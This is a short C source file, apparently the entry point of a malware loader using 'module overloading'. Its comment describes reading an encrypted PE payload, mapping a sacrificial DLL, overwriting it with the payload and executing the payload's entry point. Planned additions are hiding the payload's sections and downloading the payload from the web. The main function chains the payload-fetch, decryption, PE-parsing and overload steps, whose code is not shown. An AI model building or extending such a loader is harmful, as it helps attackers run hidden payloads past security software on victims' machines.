#include "main.h"
#include "structs.h"


/*------------------------------------------------
  Simple example of Module overloading
  Features:
  1. Reads encrypted PE payload
  2. Mapps sacrificial DLL by creating a section
  3. Overwrites the DLL with the PE payload
  4. Executes the PE's entrypoint

  TODO:
  1. Use PE fluctuation to hide the PE's sections
  2. Implement getting the payload from web
------------------------------------------------*/


NTAPIS NtAPIs = { 0 };
PEHDRS peHdrs = { 0 };

int main()
{
    CONTENT cnt = { 0 };

    if (!GetSC(&cnt)) {
        return 1;
    }

    if (!Crypt(&cnt)) {
        return 1;
    }

    if (!InitPE(&peHdrs, cnt)) {
        return 1;
    }

    if (!OverLoad(&peHdrs)) {
        return 1;
    }


    return 0;
}

